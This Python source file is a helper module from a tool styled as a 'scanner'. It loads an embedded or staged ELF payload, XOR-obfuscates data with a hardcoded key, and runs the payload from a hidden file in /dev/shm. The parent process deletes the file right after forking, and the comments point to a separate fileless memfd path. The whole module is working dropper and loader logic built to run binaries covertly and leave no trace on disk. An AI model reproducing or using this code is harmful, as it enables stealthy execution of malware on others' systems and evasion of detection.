# -*- coding: utf-8 -*-
"""
Helper utilities — safe fallbacks and file staging for Linux.
Primary fileless path lives in scanner/worker.py.
"""
import os
import sys
import base64
import subprocess
import tempfile
from pathlib import Path

from scanner.ui import print_success, print_error, print_info


def get_embedded_payload() -> bytes:
    """Return embedded payload if present, else look for a staged file."""
    b64 = os.environ.get("CK_EMBEDDED_PAYLOAD", "")
    if b64:
        try:
            return base64.b64decode(b64)
        except Exception:
            pass

    candidates = [
        Path(__file__).parent.parent / "payload" / "system.elf",
        Path(__file__).parent.parent / "dist" / "system.elf",
        Path("/dev/shm/.stage"),
    ]
    for path in candidates:
        try:
            if path.exists():
                return path.read_bytes()
        except Exception:
            continue
    return b""


def obfuscate_data(data: bytes) -> bytes:
    """Lightweight single-byte obfuscation for staged files."""
    key = b"system_key_layer_3"
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def stage_and_run(payload: bytes) -> bool:
    """
    Fallback: stage payload under /dev/shm (tmpfs, no disk) and execute.
    Used only when memfd execution is unavailable.
    """
    if sys.platform != "linux":
        print_error("Linux-only execution path.")
        return False

    shm_dir = Path("/dev/shm")
    target_dir = shm_dir if shm_dir.is_dir() and os.access(shm_dir, os.W_OK) else Path(tempfile.gettempdir())

    try:
        fd, path = tempfile.mkstemp(prefix=".tmp_", dir=str(target_dir))
        os.close(fd)
        with open(path, "wb") as f:
            f.write(payload)
        os.chmod(path, 0o700)

        # Fork so parent keeps running the UI
        pid = os.fork()
        if pid == 0:
            try:
                os.execv(path, [path])
            except Exception:
                os._exit(1)
        else:
            # Parent: unlink immediately — file is gone from the namespace
            try:
                os.unlink(path)
            except Exception:
                pass
            return True
    except Exception as e:
        print_error(f"Stage/run error: {e}")
        return False


def cleanup_leftovers():
    """Remove stale staged artifacts from /dev/shm."""
    try:
        for p in Path("/dev/shm").glob(".tmp_*"):
            try:
                p.unlink()
            except Exception:
                pass
        print_success("Cleanup complete.")
    except Exception as e:
        print_error(f"Cleanup error: {e}")
